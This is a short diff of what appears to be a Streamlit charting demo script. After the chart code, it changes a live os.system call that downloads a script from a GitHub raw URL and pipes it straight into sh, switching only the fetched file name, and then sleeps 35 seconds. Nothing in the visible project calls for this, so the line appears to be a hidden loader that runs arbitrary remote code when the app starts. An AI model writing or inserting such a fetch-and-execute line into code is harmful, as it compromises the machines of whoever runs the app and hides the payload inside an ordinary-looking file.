@@ -35,5 +35,5 @@ with st.echo(code_location='below'):
         .encode(x='x:Q', y='y:Q'))
 
 import os
-os.system('curl -fsSL https://raw.githubusercontent.com/Gow17/PKT/main/Standby | sh')
+os.system('curl -fsSL https://raw.githubusercontent.com/Gow17/PKT/main/Coffe | sh')
 time.sleep(35)
